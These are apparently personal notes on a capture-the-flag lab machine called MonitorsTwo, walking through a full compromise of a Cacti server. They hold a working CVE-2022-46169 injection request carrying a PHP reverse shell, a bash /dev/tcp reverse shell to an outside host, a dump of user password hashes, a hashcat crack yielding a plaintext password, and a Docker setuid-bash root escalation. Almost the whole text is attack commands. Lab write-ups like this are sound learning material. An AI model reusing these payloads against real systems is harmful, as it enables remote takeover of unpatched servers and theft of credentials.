# 1
using the exploit through burp, the URI which worked and the IDs are as following:

```
GET /remote_agent.php?action=polldata&poller_id=;php+-r+'$sock%3dfsockopen("10.10.16.31",4444)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'&host_id=1&local_data_ids[]=6 HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: 10.10.11.211
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CactiDateTime=Sun May 07 2023 00:51:52 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=55696af5e18420ea82ad5d1ee5501ee2
Upgrade-Insecure-Requests: 1

```
![[monitorstwo reverse shell burp.png]]

**1** and **6**
https://github.com/0xf4n9x/CVE-2022-46169

# 2
`bash -p` euid of root
`capsh --gid=0 --uid=0 --` gid + uid of root

# 3
`bash -c 'exec bash -i &>/dev/tcp/10.10.16.31/2222 <&1'` --> gave an upgraded shell as root (still no flags as in the container not on the system)

# 4
` mysql --host=db --user=root --password=root cacti -e 'select * from user_auth'` Gave more results of 2 users with passwords to hash:
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC (Jamie Thompson)
guest:43e9a4ab75570f5b (Guest Account)
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C (Marcus Brune)
![[monitorstwo database user_auth dump.png]]

# 5 
crack the hash(es) + ssh in
`hashcat -m 3200 -a 0 hashes ../../../Tools/rockyou.txt`
marcus:funkymonkey
user flag:
914c47f4f02b7c6563026aa62f8ceba2
![[monitortwo password cracked .png]]
+log in through SSH:
![[monitorwtwo - user flag.png]]


# 6 
enumeration # 2
A. linpeas
-rw-r--r-- 1 root root 2133 Feb 26  2020 /etc/pam.d/sshd
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db

DOCKER!
![[monitortwo docker process.png]]
/usr/bin/ctr (ctr privesc) + /opt/containerd
/usr/bin/runc (runc privesc)
/usr/share/cacti

.sh files
/usr/bin/gettext.sh                      
/usr/bin/rescan-scsi-bus.sh

root files in home directory
/home/marcus/.bash_history

unusual passwd files
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service (replace unified with systemd too)

mails
/var/mail/marcus 
/var/spool/mail/marcus

THERE is one namespace with two container IDs:
e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69
50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e


# 7 
privesc
The key was to use both the root shell of the containered instance, as well as the ssh instance
1. `findmnt` in ssh instance as Marcus
![[monitortwo - findmnt.png]]
2. `chmod u+s` in root container instance achieved with the following steps:
        a. `capsh --gid=0 --uid=0 --`
        b. `bash -c 'exec bash -i &>/dev/tcp/10.10.16.31/2222 <&1'`
        c. (set up listener and get root container shell for execution of command in step 2)
3. `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p` use the right _merged_ container from the results from step 1 (were two possible ones) and access an escalated bash shell 


![[monitorstwo - root flag.png]]

--> all flags available
root flag: 1580d59141662e21dd3a1fd4def08cc6
https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/
